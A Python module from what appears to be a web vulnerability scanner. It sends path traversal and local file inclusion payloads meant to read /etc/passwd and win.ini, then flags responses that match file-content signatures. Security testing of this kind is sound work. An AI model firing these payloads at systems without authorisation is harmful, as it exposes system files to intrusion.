"""Path traversal / LFI module."""
from __future__ import annotations

import re

from penpine.attack.generator import PayloadGenerator
from penpine.attack.models import Confidence, Finding, Payload, TestCase
from penpine.attack.module import AttackModule
from penpine.attack.modules._common import body_text, search_signatures
from penpine.attack.validator import Validator

TRAVERSAL_PAYLOADS = [
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd",
]

TRAVERSAL_SIGNATURES = [re.compile(pattern, re.I) for pattern in [
    r"root:.*:0:0:",
    r"daemon:.*:/usr/sbin",
    r"\[(?:extensions|fonts|mci extensions)\]",
    r"for 16-bit app support",
]]


class TraversalGenerator(PayloadGenerator):
    def __init__(self, payloads=None):
        self._payloads = list(payloads) if payloads is not None else list(TRAVERSAL_PAYLOADS)

    def generate(self, point, request):
        for value in self._payloads:
            yield TestCase(point=point, payload=Payload(value, technique="lfi"),
                           attack_type="path-traversal")


class TraversalValidator(Validator):
    def __init__(self, signatures=None):
        self._signatures = (list(signatures) if signatures is not None
                            else list(TRAVERSAL_SIGNATURES))

    def evaluate(self, test_case, response, baseline=None):
        match = search_signatures(body_text(response), self._signatures)
        if match is None:
            return None
        if baseline is not None and search_signatures(body_text(baseline), self._signatures):
            return None
        return Finding("path-traversal", test_case.point, test_case.payload, Confidence.HIGH,
                       f"file content signature: {match.group(0)[:80]}",
                       request=test_case.request, response=response)


TRAVERSAL_MODULE = AttackModule("path-traversal", TraversalGenerator(), TraversalValidator(),
                                applies_to=("param", "form", "json", "multipart", "path-seg", "cookie"),
                                description="path traversal / LFI")
